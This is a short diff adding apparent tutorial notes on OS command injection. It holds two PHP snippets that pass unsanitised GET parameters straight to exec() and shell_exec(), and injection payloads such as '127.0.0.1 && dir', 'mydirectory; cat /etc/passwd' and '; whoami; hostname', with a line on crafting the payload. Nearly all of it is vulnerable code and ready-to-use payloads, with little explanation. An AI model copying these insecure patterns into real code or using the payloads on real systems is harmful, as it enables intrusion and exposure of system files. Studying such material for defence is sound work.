@@ -1,0 +1,20 @@
+127.0.0.1 && dir
+$ip = $_GET['ip'];
+$command = "ping " . $ip;
+exec($command);
+
+<?php
+$directory = $_GET['directory'];
+$result = shell_exec('ls ' . $directory);
+echo "<pre>$result</pre>";
+?>
+
+mydirectory; cat /etc/passwd
+
+ls mydirectory; cat /etc/passwd
+
+Craft the payload: Construct a payload that includes the desired commands to retrieve the user and hostname information. For example:
+
+Payload: ; whoami; hostname
+
+This payload appends the commands whoami and hostname after the vulnerable parameter.
